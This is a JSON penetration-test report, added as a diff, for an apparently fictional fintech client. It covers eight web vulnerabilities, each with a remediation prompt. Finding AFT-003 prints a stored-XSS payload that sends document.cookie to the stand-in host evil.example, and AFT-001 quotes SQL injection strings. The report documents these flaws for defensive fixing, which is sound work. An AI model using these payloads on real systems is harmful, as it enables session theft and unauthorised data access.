@@ -1,0 +1,105 @@
+{
+  "meta": {
+    "client_name": "Acme Fintech Inc.",
+    "assessment_name": "Q3 2026 Web Application Penetration Test",
+    "prepared_by": "AuditReport-Engine"
+  },
+  "scope": {
+    "tested": [
+      "app.acmefintech.com (production web application)",
+      "api.acmefintech.com (REST API v2)",
+      "Authentication and session management flows",
+      "Payment processing integration (Stripe checkout only, sandbox mode)",
+      "Admin dashboard (staging environment)"
+    ],
+    "not_tested": [
+      "Native iOS and Android mobile applications",
+      "Internal corporate network and employee devices",
+      "Third-party vendor infrastructure (Stripe, AWS, Auth0 internals)",
+      "Physical security controls",
+      "Social engineering and phishing simulations"
+    ]
+  },
+  "findings": [
+    {
+      "id": "AFT-001",
+      "title": "SQL Injection in Invoice Search Endpoint",
+      "category": "Injection",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "attacker_narrative": "An attacker on the internet, without needing to log in, could send a specially crafted search request to the invoice lookup feature and directly read or modify any customer's financial records in the database, including other companies' invoices and payment history.",
+      "technical_detail": "The `/api/v2/invoices/search?q=` parameter is concatenated directly into a SQL query in `InvoiceSearchController.search()` without parameterization. A payload such as `' OR 1=1 UNION SELECT ...` returns arbitrary rows from the `invoices` and `users` tables. Confirmed via boolean-based blind injection and time-based delays.",
+      "fix_prompt": "In InvoiceSearchController.search(), replace the raw string-concatenated SQL query with a parameterized query using the ORM's query builder (e.g. `Invoice.objects.filter(description__icontains=q)` or an equivalent prepared statement with bound parameters). Add an input validation layer that rejects non-alphanumeric characters in the search term before it reaches the query layer. Add a regression test that submits `' OR 1=1--` and asserts a 0-row or 400 response.",
+      "affected_asset": "api.acmefintech.com/api/v2/invoices/search"
+    },
+    {
+      "id": "AFT-002",
+      "title": "Broken Access Control on Admin User Deletion",
+      "category": "Broken Access Control",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "attacker_narrative": "Any logged-in customer, even one with the lowest permission level, can delete other customers' accounts by changing a single ID number in the web request, with no additional authorization check.",
+      "technical_detail": "`DELETE /api/v2/admin/users/{id}` checks only that the requester has a valid session token, but does not verify the caller's role is `admin` nor that they belong to the same tenant. A standard 'member' role JWT successfully deletes arbitrary user IDs across tenants.",
+      "fix_prompt": "Add a role-based authorization middleware/decorator (e.g. `@require_role('admin')`) to the admin user deletion route and every other route under `/api/v2/admin/*`. Additionally enforce tenant-scoping by checking `user.tenant_id == target.tenant_id` before permitting the delete. Write an integration test asserting a 403 is returned when a non-admin token calls this endpoint.",
+      "affected_asset": "api.acmefintech.com/api/v2/admin/users/{id}"
+    },
+    {
+      "id": "AFT-003",
+      "title": "Stored Cross-Site Scripting in Support Ticket Comments",
+      "category": "Cross-Site Scripting (XSS)",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+      "attacker_narrative": "A malicious customer can post a support comment containing hidden code that runs in the browser of any staff member who later views that ticket, potentially letting the attacker steal the staff member's session and act as them.",
+      "technical_detail": "The `comment_body` field on `/support/tickets/{id}/comments` is rendered in the admin dashboard via `dangerouslySetInnerHTML` without sanitization. A payload of `<img src=x onerror=fetch('//evil.example/steal?c='+document.cookie)>` executes when an agent opens the ticket.",
+      "fix_prompt": "Sanitize all user-submitted comment content server-side using a library such as DOMPurify (client) or bleach (Python) before storage or render, allowlisting only a small set of safe tags (b, i, p, br, a[href]). Remove the `dangerouslySetInnerHTML` usage in the ticket comment renderer and replace with sanitized output or a markdown renderer that escapes HTML by default. Add a test posting a `<script>` payload and asserting it is stripped on render.",
+      "affected_asset": "app.acmefintech.com/support/tickets/{id}"
+    },
+    {
+      "id": "AFT-004",
+      "title": "Session Tokens Do Not Expire After Password Reset",
+      "category": "Session Management",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+      "attacker_narrative": "If a customer's account is compromised and they change their password to lock the attacker out, the attacker's existing login session keeps working anyway, so the password reset does not actually remove their access.",
+      "technical_detail": "`POST /api/v2/auth/reset-password` updates the password hash but does not invalidate existing JWTs or revoke server-side session records. Tokens issued before the reset remain valid until their original expiry (7 days).",
+      "fix_prompt": "On successful password reset, invalidate all existing sessions for that user by incrementing a `token_version` field on the user record and including it as a claim in issued JWTs; reject tokens whose `token_version` claim doesn't match the current value. Alternatively, maintain a server-side session table and delete all rows for that user_id on reset. Add a test verifying a pre-reset token is rejected immediately after a password change.",
+      "affected_asset": "api.acmefintech.com/api/v2/auth/reset-password"
+    },
+    {
+      "id": "AFT-005",
+      "title": "Verbose Error Messages Expose Stack Traces",
+      "category": "Information Disclosure",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+      "attacker_narrative": "When something goes wrong on the site, error pages sometimes reveal internal file paths, library versions, and code snippets, giving an attacker a roadmap of the technology used and easier targets to attack next.",
+      "technical_detail": "Unhandled exceptions in the Flask backend return the default debug traceback page in production (`app.debug = True` was left enabled), exposing file paths under `/srv/acme/app/`, the Flask and SQLAlchemy versions, and local variable values at the point of failure.",
+      "fix_prompt": "Set `app.debug = False` and `app.config['PROPAGATE_EXCEPTIONS'] = False` in the production configuration. Register a generic error handler (`@app.errorhandler(Exception)`) that logs the full traceback server-side (e.g. to Sentry) but returns a generic JSON error `{\"error\": \"Internal server error\"}` with a 500 status to the client. Verify via a test that triggers an unhandled exception and asserts no stack trace appears in the response body.",
+      "affected_asset": "api.acmefintech.com (all endpoints)"
+    },
+    {
+      "id": "AFT-006",
+      "title": "Missing Rate Limiting on Login Endpoint",
+      "category": "Authentication",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+      "attacker_narrative": "An attacker can attempt to guess thousands of passwords per minute against any customer's account without being slowed down or locked out, making automated password-guessing attacks practical.",
+      "technical_detail": "`POST /api/v2/auth/login` has no rate limiting, CAPTCHA, or account lockout after repeated failed attempts. Automated testing sent 5,000 login attempts against a single account in under 2 minutes with no throttling or blocking observed.",
+      "fix_prompt": "Add rate limiting to the login endpoint using a library such as Flask-Limiter or an API gateway rule, capping attempts to e.g. 5 per minute per IP and 10 per hour per account, with exponential backoff. Implement temporary account lockout or CAPTCHA after 5 consecutive failures for a given account. Add a test asserting the 6th rapid login attempt from the same IP returns 429.",
+      "affected_asset": "api.acmefintech.com/api/v2/auth/login"
+    },
+    {
+      "id": "AFT-007",
+      "title": "Outdated jQuery Version with Known XSS Vulnerabilities",
+      "category": "Vulnerable Components",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+      "attacker_narrative": "The site uses an old version of a common JavaScript library that has publicly known security holes, similar to leaving an old lock on the door that locksmiths already know how to pick.",
+      "technical_detail": "The marketing site at app.acmefintech.com/about loads jQuery 1.12.4 (released 2016), which is affected by several published CVEs including CVE-2020-11022 and CVE-2020-11023 (XSS via `.html()`/`.append()` with untrusted HTML). No exploitable sink using these methods with attacker-controlled input was found during this assessment, but the outdated dependency itself is a risk factor.",
+      "fix_prompt": "Upgrade jQuery to the latest 3.x release across all pages that reference it, or remove the dependency entirely if only used for simple DOM queries that vanilla JS can handle. Add a dependency scanning step (e.g. `npm audit` or Snyk) to the CI pipeline to catch outdated/vulnerable frontend libraries automatically going forward.",
+      "affected_asset": "app.acmefintech.com/about (static marketing pages)"
+    },
+    {
+      "id": "AFT-008",
+      "title": "Missing Security Headers (CSP, HSTS)",
+      "category": "Security Misconfiguration",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N",
+      "attacker_narrative": "The site is missing a few standard browser-level protections that would make certain attacks, like tricking a user's browser into loading malicious scripts, significantly harder to pull off even if another bug is found later.",
+      "technical_detail": "Response headers from app.acmefintech.com are missing `Content-Security-Policy`, `Strict-Transport-Security`, and `X-Content-Type-Options`. Absent CSP raises the impact of any future XSS finding; absent HSTS allows SSL-stripping downgrade attacks on unencrypted first requests.",
+      "fix_prompt": "Add the following response headers at the web server or application middleware level: `Strict-Transport-Security: max-age=31536000; includeSubDomains`, `X-Content-Type-Options: nosniff`, and a `Content-Security-Policy` starting in report-only mode (e.g. `default-src 'self'; script-src 'self' cdn.acmefintech.com`) before enforcing it. Verify with a test asserting these headers are present on all responses.",
+      "affected_asset": "app.acmefintech.com (all pages)"
+    }
+  ]
+}
